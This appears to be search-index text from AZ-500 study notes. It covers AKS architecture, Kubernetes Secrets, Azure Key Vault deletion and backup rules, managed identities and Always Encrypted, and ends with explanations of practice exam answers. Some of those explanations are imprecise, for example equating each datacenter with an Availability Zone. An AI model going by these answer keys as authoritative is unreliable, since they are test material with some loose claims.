nodes, and the Azure platform configures the secure communication between the cluster master and nodes. Interaction with the cluster master occurs through Kubernetes APIs, such as\u00a0<code>kubectl</code>\u00a0or the Kubernetes dashboard.</p> <p>This managed cluster master means that you do not need to configure components like a highly available store, but it also means that you cannot access the cluster master directly. Upgrades to Kubernetes are orchestrated through the Azure CLI or Azure portal, which upgrades the cluster master and then the nodes. To troubleshoot possible issues, you can review the cluster master logs through Azure Log Analytics.</p> <p>If you need to configure the cluster master in a particular way or need direct access to them, you can deploy your own Kubernetes cluster using\u00a0<code>aks-engine</code>.</p> <p>Nodes and node pools: To run your applications and supporting services, you need a Kubernetes node. An AKS cluster has one or more nodes, which is an Azure virtual machine (VM) that runs the Kubernetes node components and container runtime:</p> <ul> <li>The kubelet is the Kubernetes agent that processes the orchestration requests from the control plane and scheduling of running the requested containers.</li> <li>Virtual networking is handled by the kube-proxy on each node. The proxy routes network traffic and manages IP addressing for services and pods.</li> <li>The\u00a0container runtime\u00a0is the component that allows containerized applications to run and interact with additional resources such as the virtual network and storage. In AKS, Moby is used as the container runtime.</li> </ul> <p>The Azure VM size for your nodes defines how many CPUs, how much memory, and the size and type of storage available (such as high-performance SSD or regular HDD). If you anticipate a need for applications that require large amounts of CPU and memory or high-performance storage, plan the node size accordingly. You can also scale out the number of nodes in your AKS cluster to meet demand.</p> <p>In AKS, the VM image for the nodes in your cluster is currently based on Ubuntu Linux or Windows Server 2019. When you create an AKS cluster or scale out the number of nodes, the Azure platform creates the requested number of VMs and configures them. There's no manual configuration for you to perform. Agent nodes are billed as standard virtual machines, so any discounts you have on the VM size you're using (including Azure reservations) are automatically applied. If you need to use a different host OS, container runtime, or include custom packages, you can deploy your own Kubernetes cluster using aks-engine. The upstream aks-engine releases features and provides configuration options before they are officially supported in AKS clusters. For example, if you wish to use a container runtime other than Moby, you can use aks-engine to configure and deploy a Kubernetes cluster that meets your current needs.</p> <p>Some basic concepts</p> <ul> <li>Pools: Group of nodes with identical configuration.</li> <li>Node: Individual VM running containerized applications.</li> <li>Pods: Single instance of an application. A pod can contain multiple containers.</li> <li>Deployment: One or more identical pods managed by Kubernetes.</li> <li>Manifest: YAML file describing a deployment.</li> </ul> <p>AKS nodes are Azure virtual machines that you manage and maintain. Linux nodes run an optimized Ubuntu distribution using the Moby container runtime. Windows Server nodes run an optimized Windows Server 2019 release and also use the Moby container runtime. When an AKS cluster is created or scaled up, the nodes are automatically deployed with the latest OS security updates and configurations.</p> <ul> <li>Linux: The Azure platform automatically applies OS security patches to Linux nodes on a nightly basis. If a Linux OS security update requires a host reboot, that reboot is not automatically performed. You can manually reboot the Linux nodes, or a common approach is to use Kured, an open-source reboot daemon for Kubernetes. Kured runs as a DaemonSet and monitors each node for the presence of a file indicating that a reboot is required. Reboots are managed across the cluster using the same cordon and drain process as a cluster upgrade.</li> <li>Windows: Windows Update does not automatically run and apply the latest updates. On a regular schedule around the Windows Update release cycle and your own validation process, you should perform an upgrade on the Windows Server node pool(s) in your AKS cluster. This upgrade process creates nodes that run the latest Windows Server image and patches, then removes the older nodes. Nodes are deployed into a private virtual network subnet, with no public IP addresses assigned. For troubleshooting and management purposes, SSH is enabled by default. This SSH access is only available using the internal IP address.</li> </ul> <p>To provide storage, the nodes use Azure Managed Disks. For most VM node sizes, these are Premium disks backed by high-performance SSDs. The data stored on managed disks is automatically encrypted at rest within the Azure platform. To improve redundancy, these disks are also securely replicated within the Azure datacenter.</p> <p>Kubernetes environments, in AKS or elsewhere, currently aren't completely safe for hostile multi-tenant usage. Additional security features such as Pod Security Policies or more fine-grained role-based access controls (RBAC) for nodes make exploits more difficult. However, for true security when running hostile multi-tenant workloads, a hypervisor is the only level of security that you should trust. The security domain for Kubernetes becomes the entire cluster, not an individual node. For these types of hostile multi-tenant workloads, you should use physically isolated clusters.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-2-platform-protection/#46-azure-kubernetes-service-networking","title":"4.6.

You can manually create these data volumes to be assigned to pods directly, or have Kubernetes automatically create them. These data volumes can use Azure Disks or Azure Files:</p> <ul> <li>Azure Disks\u00a0can be used to create a Kubernetes DataDisk resource. Disks can use Azure Premium storage, backed by high-performance SSDs, or Azure Standard storage, backed by regular HDDs. For most production and development workloads, use Premium storage. Azure Disks are mounted as ReadWriteOnce, so are only available to a single pod. For storage volumes that can be accessed by multiple pods simultaneously, use Azure Files.</li> <li>Azure Files\u00a0can be used to mount an SMB 3.0 share backed by an Azure Storage account to pods.

The StorageClass also defines the reclaimPolicy. This reclaimPolicy controls the behavior of the underlying Azure storage resource when the pod is deleted and the persistent volume may no longer be required. The underlying storage resource can be deleted, or retained for use with a future pod. In AKS, two initial StorageClasses are created:</p> <ul> <li>default\u00a0- Uses Azure Standard storage to create a Managed Disk. The reclaim policy indicates that the underlying Azure Disk is deleted when the persistent volume that used it is deleted.</li> <li>managed-premium\u00a0- Uses Azure Premium storage to create Managed Disk. The reclaim policy again indicates that the underlying Azure Disk is deleted when the persistent volume that used it is deleted.</li> </ul> <p>If no StorageClass is specified for a persistent volume, the default StorageClass is used.</p> <p>A PersistentVolumeClaim requests either Disk or File storage of a particular StorageClass, access mode, and size. The Kubernetes API server can dynamically provision the underlying storage resource in Azure if there is no existing resource to fulfill the claim based on the defined StorageClass. The pod definition includes the volume mount once the volume has been connected to the pod.

A service account exists and is managed by, the Kubernetes API. The credentials for service accounts are stored as Kubernetes secrets, which allows them to be used by authorized pods to communicate with the API Server. Most API requests provide an authentication token for a service account or a normal user account. Normal user accounts allow more traditional access for human administrators or developers, not just services and processes. Kubernetes itself doesn't provide an identity management solution where regular user accounts and passwords are stored. Instead, external identity solutions can be integrated into Kubernetes. For AKS clusters, this integrated identity solution is Microsoft Entra ID.</li> <li>Microsoft Entra integration: The security of AKS clusters can be enhanced with the integration of Microsoft Entra ID. With Microsoft Entra ID, you can integrate on-premises identities into AKS clusters to provide a single source for account management and security. With Microsoft Entra integrated AKS clusters, you can grant users or groups access to Kubernetes resources within a namespace or across the cluster. To obtain a Kubectl configuration context, a user can run the az aks get-credentials command.

You first create a Secret using the Kubernetes API. When you define your pod or deployment, a specific Secret can be requested. Secrets are only provided to nodes that have a scheduled pod that requires it, and the Secret is stored in tmpfs, not written to disk. When the last pod on a node that requires a Secret is deleted, the Secret is deleted from the node's tmpfs. Secrets are stored within a given namespace and can only be accessed by pods within the same namespace. The use of Secrets reduces the sensitive information that is defined in the pod or service YAML manifest. Instead, you request the Secret stored in Kubernetes API Server as part of your YAML manifest. This approach only provides the specific pod access to the Secret.

Azure Key Vault","text":"<p>Azure Key Vault helps safeguard cryptographic keys and secrets that cloud applications and services use. Key Vault streamlines the key management process and enables you to maintain control of keys that access and encrypt your data.  Developers can create keys for development and testing in minutes, and then migrate them to production keys. Security administrators can grant (and revoke) permission to keys, as needed. You can use Key Vault to create multiple secure containers, called vaults. Vaults help reduce the chances of accidental loss of security information by centralizing application secrets storage. Key vaults also control and log the access to anything stored in them.</p> <p>Azure Key Vault helps address the following issues:</p> <ul> <li>Secrets management. You can use Azure Key Vault to securely store and tightly control access to tokens, passwords, certificates, API keys, and other secrets.</li> <li>Key management. You use Azure Key Vault as a key management solution, making it easier to create and control the encryption keys used to encrypt your data.</li> <li>Certificate management. Azure Key Vault is also a service that lets you easily provision, manage, and deploy public and private SSL/TLS certificates for use with Azure and your internal connected resources.</li> <li>Store secrets backed by hardware security modules (HSMs). The secrets and keys can be protected either by software, or FIPS 140-2 Level 2 validates HSMs.</li> </ul> <p>Key Vault is not intended as storage for user passwords.</p> <p>Access to a key vault is controlled through two separate interfaces: management plane, and data plane. The management plane and data plane access controls work independently. Use RBAC to control what users have access to. For example, if you want to grant an application access to use keys in a key vault, you only need to grant data plane access permissions by using key vault access policies, and no management plane access is needed for this application. Conversely, if you want a user to be able to read vault properties and tags but not have any access to keys, secrets, or certificates, you can grant this user read access by using RBAC, and no access to the data plane is required. </p> <p>If a user has contributor permissions (RBAC) to a key vault management plane, they can grant themselves access to the data plane by setting a key vault access policy. We recommend that you tightly control who has contributor access to your key vaults, to ensure that only authorized persons can access and manage your key vaults, keys, secrets, and certificates.</p> <p>Azure Resource Manager can securely deploy certificates stored in Azure Key Vault to Azure VMs when the VMs are deployed. By setting appropriate access policies for the key vault, you also control who gets access to your certificate. Another benefit is that you manage all your certificates in one place in Azure Key Vault.</p> <p>Deletion of key vaults or key vault objects can be either inadvertent or malicious. Enable the soft delete and purge protection features of Key Vault, particularly for keys that are used to encrypt data at rest. Deletion of these keys is equivalent to data loss, so you can recover deleted vaults and vault objects if needed.

Key vault secrets","text":"<p>Key Vault provides secure storage of secrets, such as passwords and database connection strings. From a developer's perspective, Key Vault APIs accept and return secret values as strings. Internally, Key Vault stores and manages secrets as sequences of octets (8-bit bytes), with a maximum size of 25k bytes each. The Key Vault service doesn't provide semantics for secrets. It merely accepts the data, encrypts it, stores it, and returns a secret identifier (\"ID\"). The identifier can be used to retrieve the secret at a later time.</p> <p>Key Vault also supports a contentType field for secrets. Clients may specify the content type of a secret to assist in interpreting the secret data when it's retrieved. The maximum length of this field is 255 characters. There are no pre-defined values. The suggested usage is as a hint for interpreting the secret data. For instance, an implementation may store both passwords and certificates as secrets, then use this field to differentiate.</p> <p></p> <p>As shown above, the values for Key Vault Secrets are:</p> <ul> <li>Name-value pair -\u00a0Name must be unique in the Vault</li> <li>Value can be any\u00a0Unicode Transformation Format (UTF-8)\u00a0string - max of 25 KB in size</li> <li>Manual or certificate creation</li> <li>Activation date</li> <li>Expiration date</li> </ul> <p>Encryption. - All secrets in your Key Vault are stored encrypted. Key Vault encrypts secrets at rest with a hierarchy of encryption keys, with all keys in that hierarchy are protected by modules that are Federal Information Processing Standards (FIPS) 140-2 compliant. This encryption is transparent, and requires no action from the user. The Azure Key Vault service encrypts your secrets when you add them, and decrypts them automatically when you read them. The encryption leaf key of the key hierarchy is unique to each key vault. The encryption root key of the key hierarchy is unique to the security world, and its protection level varies between regions:</p> <ul> <li>China: root key is protected by a module that is validated for FIPS 140-2 Level 1.</li> <li>Other regions: root key is protected by a module that is validated for FIPS 140-2 Level 2 or higher.</li> </ul> <p>Secret attributes. - In addition to the secret data, the following attributes may be specified:</p> <ul> <li>exp: IntDate, optional,\u00a0default is forever.

This safeguard offer the following protections:</p> <ul> <li>Once a secret, key, certificate, or key vault is deleted, it remains recoverable for a configurable period of 7 to 90 calendar days. If no configuration is specified, the default recovery period is set to 90 days. Users are provided with sufficient time to notice an accidental secret deletion and respond.</li> <li>When creating a new key vault, soft-delete is on by default. Once soft-delete is enabled on a key vault, it can't be disabled.  Once set, the retention policy interval can't be changed.</li> <li>The soft-delete feature is available through the REST API, the Azure CLI, PowerShell, .NET/C# interfaces, and ARM templates.</li> <li>The purge protection retention policy uses the same interval (7-90 days).  Once set, the retention policy interval can't be changed.</li> <li>You can't reuse the name of a key vault that has been soft-deleted until the retention period has passed.</li> <li> <p>Permanently deleting, purging, a key vault is possible via a POST operation on the proxy resource and requires special privileges. Generally, only the subscription owner is able to purge a key vault. The POST operation triggers the immediate and irrecoverable deletion of that vault. Exceptions are:</p> <ul> <li>When the Azure subscription has been marked as\u00a0undeletable. In this case, only the service may then perform the actual deletion, and does so as a scheduled process.</li> <li>When the--enable-purge-protection argument is enabled on the vault itself. In this case, Key Vault waits for 90 days from when the original secret object was marked for deletion to permanently delete the object.</li> </ul> </li> <li> <p>To purge a secret in the soft-deleted state, a service principal must be granted another \"purge\" access policy permission. The purge access policy permission isn't granted by default to any service principal including key vault and subscription owners and must be deliberately set. By requiring an elevated access policy permission to purge a soft-deleted secret, it reduces the probability of accidentally deleting a secret.</p> </li> </ul> <p>Key vault recovery. - Upon deleting a key vault object, the service will place the object in a deleted state, making it inaccessible to any retrieval operations. During the soft-delete retention interval, the following apply:</p> <ul> <li>You may list all of the key vaults and key vault objects in the soft-delete state for your subscription as well as access deletion and recovery information about them. Only users with special permissions can list deleted vaults. We recommend that our users create a custom role with these special permissions for handling deleted vaults.</li> <li>A key vault with the same name can't be created in the same location; correspondingly, a key vault object can't be created in a given vault if that key vault contains an object with the same name and which is in a deleted state.</li> <li>Only a privileged user may restore a key vault or key vault object by issuing a recover command on the corresponding proxy resource. The user, member of the custom role, who has the privilege to create a key vault under the resource group can restore the vault.</li> <li>Only a privileged user may forcibly delete a key vault or key vault object by issuing a delete command on the corresponding proxy resource.</li> </ul> <p>Unless a key vault or key vault object is recovered, at the end of the retention interval the service performs a purge of the soft-deleted key vault or key vault object and its content. Resource deletion may not be rescheduled.</p> <p>Billing. - In general, when an object (a key vault or a key or a secret) is in deleted state, there are only two operations possible: 'purge' and 'recover'. All the other operations fail. Therefore, even though the object exists, no operations can be performed and hence no usage will occur, so no bill. However there are following exceptions:</p> <ul> <li>'purge' and 'recover' actions count towards normal key vault operations and billed.</li> <li>If the object is an HSM-key, the 'HSM Protected key' charge per key version per month charge applies if a key version has been used in last 30 days. After that, since the object is in deleted state no operations can be performed against it, so no charge will apply.</li> </ul> <p>Soft-deleted protection by default from February 2025. -  If a secret is deleted and the key vault doesn't have soft-deleted protection, it's deleted permanently. Although users can currently opt out of soft-delete during key vault creation, this ability is deprecated. In February 2025, Microsoft enables soft-delete protection on all key vaults, and users are no longer be able to opt out of or turn off soft-delete. This, protect secrets from accidental or malicious deletion by a user.</p> <p></p> <p>Key vault backup. - Back up secrets only if you have a critical business justification. Backing up secrets in your key vault may introduce operational challenges such as maintaining multiple sets of logs, permissions, and backups when secrets expire or rotate. Key Vault maintains availability in disaster scenarios and will automatically fail over requests to a paired region without any intervention from a user. If you want protection against accidental or malicious deletion of your secrets, configure soft-delete and purge protection features on your key vault.</p> <p>Key Vault does not support the ability to backup more than 500 past versions of a key, secret, or certificate object. Attempting to backup a key, secret, or certificate object may result in an error. It is not possible to delete previous versions of a key, secret, or certificate.</p> <p>Key Vault doesn't currently provide a way to back up an entire key vault in a single operation. Any attempt to use the commands listed in this document to do an automated backup of a key vault may result in errors and not supported by Microsoft or the Azure Key Vault team.</p> <p>When you back up a key vault object, such as a secret, key, or certificate, the backup operation downloads the object as an encrypted blob. This blob can't be decrypted outside of Azure.\u00a0To get usable data from this blob, you must restore the blob into a key vault within the same Azure subscription and Azure geography. To back up a key vault object, you must have:</p> <ul> <li>Contributor-level or higher permissions on an Azure subscription.</li> <li>A primary key vault that contains the secrets you want to back up.</li> <li>A secondary key vault where secrets are restored.</li> </ul> <p>Azure Dedicated HSM is most suitable for \u201clift-and-shift\u201d scenarios that require direct and sole access to HSM devices.

You can use the identity to authenticate to any service that supports Microsoft Entra authentication, including Key Vault, without any credentials in your code. The managed identities for Azure resources feature is free with Microsoft Entra ID for Azure subscriptions. There's no additional cost.</p> <p>Terminology. - The following terms are used throughout the managed identities for Azure resources documentation set:</p> <ul> <li>Client ID\u00a0- a unique identifier generated by Microsoft Entra ID that is tied to an application and service principal during its initial provisioning.</li> <li>Principal ID\u00a0- the object ID of the service principal object for your managed identity that is used to grant role-based access to an Azure resource.</li> <li>Azure Instance Metadata Service (IMDS)\u00a0- a REST endpoint accessible to all IaaS VMs created via the Azure Resource Manager. The endpoint is available at a well-known non-routable IP address (169.254.169.254) that can be accessed only from within the VM.</li> </ul> <p>How managed identities for Azure resources works. - There are two types of managed identities:</p> <ul> <li>A system-assigned managed identity\u00a0is enabled directly on an Azure service instance. When the identity is enabled, Azure creates an identity for the instance in the Microsoft Entra tenant that's trusted by the subscription of the instance. After the identity is created, the credentials are provisioned onto the instance. The lifecycle of a system-assigned identity is directly tied to the Azure service instance that it's enabled on. If the instance is deleted, Azure automatically cleans up the credentials and the identity in Microsoft Entra ID.</li> <li>A user-assigned managed identity\u00a0is created as a standalone Azure resource. Through a create process, Azure creates an identity in the Microsoft Entra tenant that's trusted by the subscription in use. After the identity is created, the identity can be assigned to one or more Azure service instances. The lifecycle of a user-assigned identity is managed separately from the lifecycle of the Azure service instances to which it's assigned.</li> </ul> <p>The following table shows the differences between the two types of managed identities:</p> Property System-assigned managed identity User-assigned managed identity Creation Created as part of an Azure resource (for example, Azure Virtual Machines or Azure App Service). Created as a stand-alone Azure resource. Life cycle Shared life cycle with the Azure resource that the managed identity is created with.   When the parent resource is deleted, the managed identity is deleted as well. Independent life cycle.  Must be explicitly deleted. Sharing across Azure resources Can\u2019t be shared.  It can only be associated with a single Azure resource. Can be shared.  The same user-assigned managed identity can be associated with more than one Azure resource. Common use cases Workloads contained within a single Azure resource.  Workloads needing independent identities.  For example, an application that runs on a single virtual machine. Workloads that run on multiple resources and can share a single identity.  Workloads needing pre-authorization to a secure resource, as part of a provisioning flow.  Workloads where resources are recycled frequently, but permissions should stay consistent.  For example, a workload where multiple virtual machines need to access the same resource. <p>Credential rotation. - Credential rotation is controlled by the resource provider that hosts the Azure resource. The default rotation of the credential occurs every 46 days. It's up to the resource provider to call for new credentials, so the resource provider could wait longer than 46 days. The following diagram shows how managed service identities work with Azure virtual machines (VMs):</p> <p></p> <ol> <li>Azure Resource Manager receives a request to enable the system-assigned managed identity on a VM.</li> <li>Azure Resource Manager creates a service principal in Microsoft Entra ID for the identity of the VM. The service principal is created in the Microsoft Entra tenant that's trusted by the subscription.</li> <li>Azure Resource Manager configures the identity on the VM by updating the Azure Instance Metadata Service identity endpoint with the service principal client ID and certificate.</li> <li>After the VM has an identity, use the service principal information to grant the VM access to Azure resources.

Discovering and classifying this data can play a pivotal role in your organizational information protection stature. It can serve as infrastructure for:</p> <ul> <li>Helping meet data privacy standards and regulatory compliance requirements.</li> <li>Addressing various security scenarios such as monitoring, auditing, and alerting on anomalous access to sensitive data.</li> <li>Controlling access to and hardening the security of databases containing highly sensitive data.</li> </ul> <p>Data exists in one of three basic states: at\u00a0rest, in\u00a0process, and in\u00a0transit. All three states require unique technical solutions for data classification, but the applied principles of data classification should be the same for each. Data that is classified as confidential needs to stay confidential when at rest, in process, or in transit.</p> <p>Data can also be either\u00a0structured\u00a0or\u00a0unstructured. Typical classification processes for structured data found in databases and spreadsheets are less complex and time-consuming to manage than those for unstructured data such as documents, source code, and email. Generally, organizations will have more unstructured data than structured data.</p> <p>Protect data at rest</p> Best practice Solution Apply disk encryption to help safeguard your data. Use Microsoft Azure Disk Encryption, which enables IT administrators to encrypt both Windows infrastructure as a service (IaaS) and Linux IaaS virtual machine (VM) disks. Disk encryption combines the industry-standard BitLocker feature and the Linux DM-Crypt feature to provide volume encryption for the operating system (OS) and the data disks. \u200eAzure Storage and Azure SQL Database encrypt data at rest by default, and many services offer encryption as an option. You can use Azure Key Vault to maintain control of keys that access and encrypt your data. Use encryption to help mitigate risks related to unauthorized data access. Encrypt your drives before you write sensitive data to them. <p>Protect data in transit</p> <p>We generally recommend that you always use SSL/TLS protocols to exchange data across different locations. . In some circumstances, you might want to isolate the entire communication channel between your on-premises and cloud infrastructures by using a VPN. For data moving between your on-premises infrastructure and Azure, consider appropriate safeguards such as HTTPS or VPN. When sending encrypted traffic between an Azure virtual network and an on-premises location over the public internet, use Azure VPN Gateway.</p> Best practice Solution Secure access from multiple workstations located on-premises to an Azure virtual network Use site-to-site VPN. Secure access from an individual workstation located on-premises to an Azure virtual network Use point-to-site VPN. Move larger data sets over a dedicated high-speed wide area network (WAN) link Use Azure ExpressRoute. If you choose to use ExpressRoute, you can also encrypt the data at the application level by using SSL/TLS or other protocols for added protection.

Always Encrypted ensures that sensitive data never appears as plaintext inside the database system. After you configure data encryption, only client applications or app servers that have access to the keys can access plaintext data. Always Encrypted uses the AEAD_AES_256_CBC_HMAC_SHA_256 algorithm to encrypt data in the database.</p> <p>Always Encrypted allows clients to encrypt sensitive data inside client applications and never reveal the encryption keys to the Database Engine (SQL Database or SQL Server).</p> <p>An example: Client On-Premises with Data in Azure __ A customer has an on-premises client application at their business location. The application operates on sensitive data stored in a database hosted in Azure (SQL Database or SQL Server running in a virtual machine on Microsoft Azure). The customer uses Always Encrypted and stores Always Encrypted keys in a trusted key store hosted on-premises, to ensure Microsoft cloud administrators have no access to sensitive data. Client and Data in Azure __ A customer has a client application, hosted in Microsoft Azure (for example, in a worker role or a web role), which operates on sensitive data stored in a database hosted in Azure (SQL Database or SQL Server running in a virtual machine on Microsoft Azure). Although Always Encrypted does not provide complete isolation of data from cloud administrators, as both the data and keys are exposed to cloud administrators of the platform hosting the client tier, the customer still benefits from reducing the security attack surface area (the data is always encrypted in the database).</p> <p>The Always Encrypted-enabled driver automatically encrypts and decrypts sensitive data in the client application before sending the data off to the SQL server. Always Encrypted supports two types of encryption: randomized encryption and deterministic encryption.</p> <ul> <li>Deterministic encryption\u00a0always generates the same encrypted value for any given plain text value. Using deterministic encryption allows point lookups, equality joins, grouping and indexing on encrypted columns. However, it may also allow unauthorized users to guess information about encrypted values by examining patterns in the encrypted column, especially if there is a small set of possible encrypted values, such as True/False, or North/South/East/West region. Deterministic encryption must use a column collation with a binary2 sort order for character columns.</li> <li>Randomized encryption\u00a0uses a method that encrypts data in a less predictable manner.

You can use SQL Server Management Studio (SSMS) or PowerShell to accomplish such tasks.</p> Task SSMS PowerShell SQL Provisioning column master keys, column encryption keys and encrypted column encryption keys with their corresponding column master keys Yes Yes No Creating key metadata in the database Yes Yes Yes Creating new tables with encrypted columns Yes Yes Yes Encrypting existing data in selected database columns Yes Yes No <p>When setting up encryption for a column, you specify the information about the encryption algorithm and cryptographic keys used to protect the data in the column. Always Encrypted uses two types of keys: column encryption keys and column master keys. A column encryption key is used to encrypt data in an encrypted column. A column master key is a key-protecting key that encrypts one or more column encryption keys.</p> <p>The Database Engine stores encryption configuration for each column in database metadata. Note, however, the Database Engine never stores or uses the keys of either type in plaintext. It only stores encrypted values of column encryption keys and the information about the location of column master keys, which are stored in external trusted key stores, such as Azure Key Vault, Windows Certificate Store on a client machine, or a hardware security module.</p> <p>To access data stored in an encrypted column in plaintext, an application must use an Always Encrypted enabled client driver. When an application issues a parameterized query, the driver transparently collaborates with the Database Engine to determine which parameters target encrypted columns and, thus, should be encrypted. For each parameter that needs to be encrypted, the driver obtains the information about the encryption algorithm and the encrypted value of the column encryption key for the column, the parameter targets, as well as the location of its corresponding column master key.</p> <p>Next, the driver contacts the key store, containing the column master key, in order to decrypt the encrypted column encryption key value and then, it uses the plaintext column encryption key to encrypt the parameter. The resultant plaintext column encryption key is cached to reduce the number of round trips to the key store on subsequent uses of the same column encryption key. The driver substitutes the plaintext values of the parameters targeting encrypted columns with their encrypted values, and it sends the query to the server for processing.</p> <p>The server computes the result set, and for any encrypted columns included in the result set, the driver attaches the encryption metadata for the column, including the information about the encryption algorithm and the corresponding keys. The driver first tries to find the plaintext column encryption key in the local cache, and only makes a round to the column master key if it can't find the key in the cache. Next, the driver decrypts the results and returns plaintext values to the application.</p> <p>A client driver interacts with a key store, containing a column master key, using a column master key store provider, which is a client-side software component that encapsulates a key store containing the column master key. Providers for common types of key stores are available in client-side driver libraries from Microsoft or as standalone downloads. You can also implement your own provider. Always Encrypted capabilities, including built-in column master key store providers vary by a driver library and its version.</p>","tags":["cloud","azure","az-500","course","certification"]},{"location":"cloud/azure/az-500-ad-4-security-operations/","title":"IV.

However, it is not directly related to the task of limiting IP addresses that can access the Kubernetes control plane. Configuring API server authorized IP ranges is the correct approach for controlling access to the control plane by specifying which IP addresses or IP ranges are allowed to interact with the Kubernetes API server. The Open Service Mesh AKS add-on addresses a different aspect of AKS management, focusing on service-to-service communication, making it less relevant for the specific task of network isolation and control of the Kubernetes control plane. Azure Front Door is a global service for routing and load balancing traffic. It is not designed for controlling access to the Kubernetes control plane. Front Door is used for directing and optimizing the delivery of web applications, and it doesn't offer the fine-grained control needed to limit access to the Kubernetes API server. CoreDNS is a DNS server used within Kubernetes clusters for service discovery. While CoreDNS can play a role in the internal DNS resolution within the cluster, it is not a tool for restricting access to the Kubernetes control plane. Customizing CoreDNS is generally related to DNS resolution configurations and would not address the task of limiting IP addresses that can access the control plane.</p>","tags":["certification","cloud","azure","microsoft","az-500"]},{"location":"cloud/azure/az-500-exams/#question-3","title":"Question 3","text":"<p>Your company has an Azure subscription and an Amazon Web Services (AWS) account.

In cloud computing, the term \"compute\" refers to the amount of computational power required to process a task - essentially, it's anything that uses processing power (CPU cycles) to perform operations. This includes, but is not limited to, running applications, executing scripts, and processing data. While virtual machines (VMs) are a common type of compute resource, they are not the only type. Azure offers a wide variety of compute resources, like Azure Functions for serverless computing, Azure Kubernetes Service for container-based applications, and Azure Batch for parallel and high-performance computing tasks. So, the definition of compute resources is broader than just VMs or certain resources listed in the Azure Marketplace. It also includes more than VMs, Storage Accounts, and Virtual Networks, as these other resources (storage and networking) have distinct roles separate from the compute resources. Storage accounts deal with data storage while virtual networks are concerned with networking aspects in Azure, not with performing tasks that require CPU cycles. Therefore, \"They are resources that execute tasks requiring CPU cycles\" is the most accurate answer.

An elastic system\u00a0is one that can automatically adjust its resources\u00a0(compute, storage, etc.) in response to changing workloads and demands. This is done to ensure optimal performance and cost-effectiveness. When demand increases, the system can scale out by adding more resources, and when demand decreases, it can scale in by reducing resources, all without significant manual intervention. The other options, while important for overall system robustness, do not define elasticity. Withstanding denial of service attacks pertains to security, maintaining availability during updates refers to zero-downtime deployment or high availability, and self-healing after a crash refers to resilience or fault tolerance.

In order to establish a site-to-site VPN connection with Azure, a VPN Gateway is required on your company's internal network. A VPN Gateway is a specific type of virtual network gateway that sends encrypted traffic across a public network, like the Internet. While the name might suggest it's a purely virtual entity, in practice, the term \"VPN Gateway\" often refers to a hardware device that's installed on-premises in your data center. This device uses Internet Protocol security (IPsec) to establish a secure, encrypted connection to the Azure VPN Gateway, which resides in the Azure virtual network. This setup allows your local network and Azure to interact as if they're directly connected. In contrast, virtual machines, virtual networks, and application gateways are other types of Azure resources, but they do not facilitate creating a site-to-site VPN connection. It's important to note that your company's internal network hardware and settings must meet specific requirements to support a VPN Gateway.

Each Azure region is composed of multiple datacenters, and each datacenter is essentially an Availability Zone. They are unique physical locations within a region, equipped with their own independent power, cooling, and networking. By placing your resources across different Availability Zones within a region, you can protect your apps and data from the failure of a single datacenter. If one datacenter goes down, the resources in the other datacenters (Availability Zones) can continue to operate, providing redundancy and increasing the overall availability of your applications. It's important to note that these zones are not the same as Azure regions (which are geographical areas containing one or more datacenters), nor are they equivalent to resource groups (which are logical containers for resources deployed on Azure). They are also not isolated to specific racks within a datacenter, but rather spread across different datacenters in a region, offering a broader scope of protection.

High availability in a system means that it is designed to operate continuously without failure for a long period of time. This is achieved by building redundancy into the system, eliminating single points of failure, and enabling rapid recovery from any failures that do occur. In other words, even if a component of the system fails, there are other components that can take over, allowing the system to continue operating seamlessly. While high availability often aims for close to 100% uptime, the claim of maintaining 100% availability is practically unrealistic due to factors like maintenance needs and unexpected failures. Also, having a minimum of two VMs may contribute to high availability but isn't a definitive requirement \u2014 it depends on the specifics of the system architecture.

Agility, in the context of cloud computing, refers to the ability of an organization to rapidly adapt to market and environmental changes in productive and cost-effective ways. It involves quickly adjusting and adapting strategic and operational capabilities to respond to and take advantage of changes in the business environment. The other options, while also benefits of the cloud, do not directly align with the concept of agility.

In a hybrid cloud model, businesses can keep sensitive data or critical applications on their private cloud or on-premises datacenter for security and compliance reasons while using the public cloud's vast resources for additional storage, computational power, or specific services when necessary. This not only allows for greater flexibility and scalability, but also offers potential cost savings.

In the context of cloud computing, a virtual machine (VM) is typically provided as part of an IaaS offering. With IaaS, the provider manages the underlying physical infrastructure (like servers, network equipment, and storage), while the consumer controls the virtualized components of the infrastructure, such as the virtual machines, their operating systems, and the applications running on them. This is contrasted with the other options. In a Platform as a Service (PaaS) model, the consumer only controls the applications and possibly some configuration settings for the application-hosting environment, but does not manage the operating system, server hardware, or network infrastructure. Similarly, in a Software as a Service (SaaS) model, the consumer only uses the software and does not control any aspect of the infrastructure or platform where the application runs. Therefore, given that a virtual machine involves control over the operating system and applications within a cloud-managed infrastructure, it aligns with the IaaS hosting model.

A CDN stores copies of a website's static files on servers distributed globally. These static files could be anything that doesn't change frequently, like images, CSS, JavaScript, videos, etc. When a user visits the site, they are served these static files from the CDN server nearest to them geographically. This reduces the latency, as the data has a shorter distance to travel. Additionally, it reduces the load on the original server because the CDN handles a significant portion of the traffic. As a result, not only is the user experience improved due to faster load times, but the operational efficiency and performance of the original server are also enhanced. Therefore, CDNs are essential for sites serving large amounts of static content to a geographically dispersed user base.

Outlook 365, part of Microsoft's Office 365 suite, is a cloud-based service that provides access to various applications and services, including email, calendars, and contact management, which are delivered over the internet. In a SaaS model, the service provider is responsible for the infrastructure, platform, and software, and ensures their maintenance and updates. Users simply access the services via a web browser or app, without needing to worry about the underlying infrastructure, platform, or software updates. This contrasts with Infrastructure as a Service (IaaS), where the user is responsible for managing the operating systems, middleware, and applications, and Platform as a Service (PaaS), where the user manages only the applications and data. In both these models, the users have more responsibilities compared to SaaS. Since Outlook 365 is a software application delivered over the web with all underlying infrastructure and platform taken care of by Microsoft, it falls into the SaaS hosting model.

Azure provides an SLA for various services, including Virtual Machines. A single VM, even with premium storage, provides a lesser SLA compared to VMs deployed in an Availability Set or across Availability Zones. While using an Availability Set (two or more VMs in the same datacenter but across fault and update domains) provides a higher SLA than a single VM, the highest SLA is provided when two or more VMs are deployed across Availability Zones in the same region. Availability Zones are unique physical locations within a region. Each zone is made up of one or more datacenters equipped with independent power, cooling, and networking. They are set up to be an isolation boundary - if one zone goes down, the other continues working. This distribution of VMs across zones provides high availability and resiliency, hence offering the highest SLA.

